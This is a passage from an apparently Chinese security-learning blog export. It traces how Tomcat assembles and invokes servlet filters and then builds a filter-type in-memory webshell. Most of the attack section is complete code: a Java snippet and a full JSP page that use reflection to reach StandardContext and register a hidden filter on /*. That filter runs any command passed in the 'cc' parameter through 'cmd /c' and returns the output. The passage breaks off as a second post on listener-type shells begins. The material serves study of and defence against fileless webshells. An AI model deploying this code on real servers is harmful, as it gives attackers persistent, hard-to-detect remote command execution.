java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\">public class testfilter implements Filter&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\">        System.out.println(&quot;filter初始化&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">        System.out.println(&quot;dofilter&quot;);</span><br><span class=\"line\">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>web.xml</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class=\"line\">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class=\"line\">         version=&quot;4.0&quot;&gt;</span><br><span class=\"line\">    &lt;filter&gt;</span><br><span class=\"line\">        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;</span><br><span class=\"line\">        &lt;filter-class&gt;testfilter&lt;/filter-class&gt;</span><br><span class=\"line\">    &lt;/filter&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;filter-mapping&gt;</span><br><span class=\"line\">        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/filter-mapping&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet&gt;</span><br><span class=\"line\">        &lt;!--servlet名字，和类名一致--&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;test&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;!--class文件名，如果有包要加上包名--&gt;</span><br><span class=\"line\">        &lt;servlet-class&gt;test&lt;/servlet-class&gt;</span><br><span class=\"line\">    &lt;/servlet&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet-mapping&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;test&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;!--url--&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/test&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/servlet-mapping&gt;</span><br><span class=\"line\">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>\n\n<p>然后访问一下 <code>/filter</code></p>\n<p>成功触发过滤器</p>\n<h3 id=\"Filter相关类\"><a href=\"#Filter相关类\" class=\"headerlink\" title=\"Filter相关类\"></a>Filter相关类</h3><p>from <a class=\"link\"   href=\"https://paper.seebug.org/1441/#tomcat\" >https://paper.seebug.org/1441/#tomcat<i class=\"fas fa-external-link-alt\"></i></a></p>\n<ul>\n<li><p><strong>Filter</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤器接口一个 Filter 程序就是一个 Java 类，这个类必须实现 Filter 接口。javax.servlet.Filter 接口中定义了三个方法：init(Web 容器创建 Filter 的实例对象后，将立即调用该 Filter 对象的 init 方法)、doFilter(当一个 Filter 对象能够拦截访问请求时，Servlet 容器将调用 Filter 对象的 doFilter 方法)、destory(该方法在 Web 容器卸载 Filter 对象之前被调用)。</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterChain</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤器链 FilterChain 对象中有一个 doFilter() 方法，该方法的作用是让 Filter 链上的当前过滤器放行，使请求进入下一个 Filter.Filter和FilterChain密不可分, Filter可以实现依次调用正是因为有了FilterChain</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤器的配置,与普通的 Servlet 程序一样，Filter 程序也很可能需要访问 Servlet 容器。Servlet 规范将代表 ServletContext 对象和 Filter 的配置参数信息都封装到一个称为 FilterConfig 的对象中。FilterConfig 接口则用于定义 FilterConfig 对象应该对外提供的方法，以便在 Filter 程序中可以调用这些方法来获取 ServletContext 对象，以及获取在 web.xml 文件中为 Filter 设置的友好名称和初始化参数。</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterDef</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">过滤器的配置和描述</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterChain</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">调用过滤器链</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">获取过滤器</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterFactory</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">组装过滤器链</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>WebXml</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一个存放web.xml中内容的类</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ContextConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一个web应用的上下文配置类</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>StandardContext</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一个web应用上下文(Context接口)的标准实现</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>StandardWrapperValve</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">一个标准Wrapper的实现。一个上下文一般包括一个或者多个包装器，每一个包装器表示一个servlet。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"Tomcat-Filter调用流程\"><a href=\"#Tomcat-Filter调用流程\" class=\"headerlink\" title=\"Tomcat Filter调用流程\"></a>Tomcat Filter调用流程</h3><p>首先 <code>ContextConfig$configureContext</code> 对 <code>web.xml</code> 进行解析，获取到 <code>WebXml</code> 实例</p>\n<p>然后直接看到 <code>StandardWrapperValve</code> ，在这里将会完成过滤器的组装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure>\n\n<p>看到这行代码，发现 <code>filterchain</code> 是由 <code>ApplicationFilterFactory$createFilterChain</code> 创建的，跟进该方法</p>\n<p>前面的代码主要是初始化 <code>filterchain</code> 变量，这里使用 <code>StandardWrapper$getParent</code> 获取当前 <code>Context</code> 也就是当前运行的WEB应用，然后使用 <code>Context</code> 的 <code>findFilterMaps</code> 获取到 <code>filterMaps</code></p>\n<p><code>filterMaps</code> 中存放了已定义的及自带的 <code>filterMap</code> ，而 <code>filterMap</code> 中存放了 filtername 及 url，然后看看 <code>filter</code> 的组装逻辑</p>\n<p><code>for循环</code> 遍历 <code>filterMaps</code> ，如果当前请求的 <code>url</code> 和 <code>filterMap</code> 中的 <code>urlPatterns</code> 相同，就会调用 <code>findFilterConfig</code> 方法寻找对应 <code>filtername</code> 的 <code>FilterConfig</code> ，如果找到就调用 <code>addFilter</code> 方法将 <code>filterConfig</code> 加入到 <code>filterChain</code></p>\n<p>跟进 <code>addFilter</code> 方法，该方法首先遍历 <code>filterChain</code> ，看看要添加的 <code>filter</code> 是否已经存在。如果存在就直接 <code>return</code></p>\n<p>如果n等于 <code>filters</code> 的长度，就说明过滤器数组满了，然后就对其进行扩容，一次扩大十个单位长度，最后将其添加进 <code>filters</code> 。至此 <code>filterChain</code> 也就组装完成了，接着回到 <code>StandardWrapperValve</code> 执行 <code>ApplicationFilterChain$doFilter</code></p>\n<p>然后跟进 <code>doFilter</code> 方法</p>\n<p>调用了 <code>internalDoFilter</code> 方法</p>\n<p>先获取 <code>filterConfig</code> ，然后通过 <code>filterConfig.getFilter()</code> 获取到 <code>filter</code> ，再调用 <code>filter</code> 的 <code>doFilter</code> 方法，就结束了 Filter 的调用。</p>\n<p>总结一下流程</p>\n<ul>\n<li>先从当前 <code>Context</code> 中获取到 <code>filterMaps</code></li>\n<li>筛选出 <code>urlPattern</code> 与当前请求 url 相符合的 <code>filtername</code></li>\n<li>根据 <code>filtername</code> 找到对应的 <code>FilterConfig</code></li>\n<li>将 <code>FilterConfig</code> 加入到 <code>filterChain</code></li>\n<li>调用 <code>filterChain</code> 的 <code>internalDoFilter</code> 遍历获取 <code>FilterConfig</code></li>\n<li>然后获取 <code>FiletrConfig</code> 对应的 <code>Filter</code> ，并调用 <code>Filter</code> 的 <code>doFilter</code></li>\n</ul>\n<h2 id=\"filter内存马注入\"><a href=\"#filter内存马注入\" class=\"headerlink\" title=\"filter内存马注入\"></a>filter内存马注入</h2><p>理清了流程，现在在就要实现内存马注入了。上面写了一个添加filter的demo，其中我们修改了配置文件，如果我们注入内存马也要修改配置文件，那显然是不行的，很容易就被排查出来了，而且还需要重启应用，所以我们要想办法实现动态 <code>filter</code> 注入。</p>\n<p>回想一下 <code>filter</code> 的获取流程，可以发现 <code>filterMaps</code> 是从当前 <code>context</code> 中获取到的</p>\n<p>那如果我们可以对这个 <code>context</code> 中存储的 <code>filterMaps</code> 进行修改是不是就可以注入自己的恶意 <code>filter</code> 了。</p>\n<p>那么怎么修改呢，我们先看一下这个 <code>context</code> ， <code>StandardContext</code> 有三个关于 <code>filter</code> 的成员变量</p>\n<ul>\n<li>filterConfigs：存储 <code>filterConfig</code> 的 <code>HashMap</code> ， <code>filterConfig</code> 中又存储了 <code>FilterDef</code> 和 <code>filter</code> 对象</li>\n<li>filterDefs：存放 <code>FilterDef</code> 的 <code>HashMap</code> ，<strong>FilterDef</strong>中存储着过滤器名，过滤器实例，匹配的url 等</li>\n<li>filterMaps：存放 <code>FilterMap</code> 的 <code>HashMap</code> ， <code>FilterMap</code> 中主要存放了 <code>FilterName</code> 和对应的 <code>URLPattern</code></li>\n</ul>\n<p>注入流程如下</p>\n<ul>\n<li>创建恶意 <code>filter</code></li>\n<li>使用 <code>FilterDef</code> 封装恶意 <code>filter</code></li>\n<li>将该 <code>FilterDef</code> 添加到 <code>FilterDefs</code> 和 <code>FilterConfig</code></li>\n<li>建立恶意 <code>filter</code> 对应的 <code>filterMap</code> ，并将其加入到 <code>filterMaps</code> 中(将其放到最前面)</li>\n</ul>\n<p>大概代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//创建filter</span><br><span class=\"line\">        Filter filter=new Filter() &#123;</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">                HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class=\"line\">                if (req.getParameter(&quot;cc&quot;) != null)&#123;</span><br><span class=\"line\">                    byte[] bytes = new byte[1024];</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    servletResponse.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                    return;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        //封装filter</span><br><span class=\"line\">        String filtername=&quot;novic4&quot;;</span><br><span class=\"line\">        FilterDef filterDef=new FilterDef();</span><br><span class=\"line\">        filterDef.setFilter(filter);</span><br><span class=\"line\">        filterDef.setFilterName(filtername);</span><br><span class=\"line\">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">        //将filterdef添加到filterdefs中</span><br><span class=\"line\">        standardContext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">        //将filterdef添加到filterconfig中</span><br><span class=\"line\">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class=\"line\">        constructor.setAccessible(true);</span><br><span class=\"line\">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">        //建立对应得filterMap</span><br><span class=\"line\">        FilterMap filterMap = new FilterMap();</span><br><span class=\"line\">        filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class=\"line\">        filterMap.setFilterName(filtername);</span><br><span class=\"line\">        //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span><br><span class=\"line\">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\"></span><br><span class=\"line\">        //插入filterMaps，将其插到首位</span><br><span class=\"line\">        standardContext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\">        //添加到filterconfigs</span><br><span class=\"line\">        Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class=\"line\">        Configs.setAccessible(true);</span><br><span class=\"line\">        Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class=\"line\">        filterConfigs.put(filtername,filterConfig);</span><br></pre></td></tr></table></figure>\n\n<p>要想修改这个 <code>context</code> ，就需要先获取到该 <code>context</code>,已知有三种获取方式</p>\n<ul>\n<li><p><strong>将 <code>servletcontext</code> 转换成 <code>StandardContext</code></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web容器启动时，每个web应用都会创建一个servletcontext对象，代表当前web应用</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">        // ApplicationContext 为 ServletContext 的实现类</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong><strong>通过Mbean获取context</strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>从线程中获取StandardContext</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<p>这里使用第一种方式写一个内存马</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //创建filter</span><br><span class=\"line\">    Filter filter=new Filter() &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">            HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class=\"line\">            if (req.getParameter(&quot;cc&quot;) != null)&#123;</span><br><span class=\"line\">                byte[] bytes = new byte[1024];</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                servletResponse.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                return;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //封装filter</span><br><span class=\"line\">    String filtername=&quot;novic4&quot;;</span><br><span class=\"line\">    FilterDef filterDef=new FilterDef();</span><br><span class=\"line\">    filterDef.setFilter(filter);</span><br><span class=\"line\">    filterDef.setFilterName(filtername);</span><br><span class=\"line\">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">    //将filterdef添加到filterdefs中</span><br><span class=\"line\">    standardContext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">    //将filterdef添加到filterconfig中</span><br><span class=\"line\">    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class=\"line\">    constructor.setAccessible(true);</span><br><span class=\"line\">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">    //建立对应得filterMap</span><br><span class=\"line\">    FilterMap filterMap = new FilterMap();</span><br><span class=\"line\">    filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class=\"line\">    filterMap.setFilterName(filtername);</span><br><span class=\"line\">    //这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span><br><span class=\"line\">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\"></span><br><span class=\"line\">    //插入filterMaps，将其插到首位</span><br><span class=\"line\">    standardContext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\">    //添加到filterconfigs</span><br><span class=\"line\">    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class=\"line\">    Configs.setAccessible(true);</span><br><span class=\"line\">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class=\"line\">    filterConfigs.put(filtername,filterConfig);</span><br><span class=\"line\">    out.print(&quot;bingo&quot;);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>不过中文回显还是有点问题</p>\n"},{"title":"Tomcat内存马—Listener型","date":"2023-06-14T14:10:33.000Z","excerpt":"Tomcat内存马—Listener型","_content":"\n\n\n## 前言\n\n之前学了 filter 型的内存马，现在继续学习 listener 型\n\n## 正文\n\n前面的 `filter` 内存马是通过动态注册恶意的 `filter` 来实现一个 `webshell` ，这个 `listener` 内存马原理其实也差不多，就是动态注册一个恶意的 `listener` 。\n\n### 构造恶意Listener\n\n这个恶意的 `Listener` 要实现一个webshell的功能，就需要获取到 `request` 对象，现在来看一下怎么构造出这个恶意 `Listener`\n\n\n\n`requestInitialized` 方法只有一个`ServletRequestEvent` 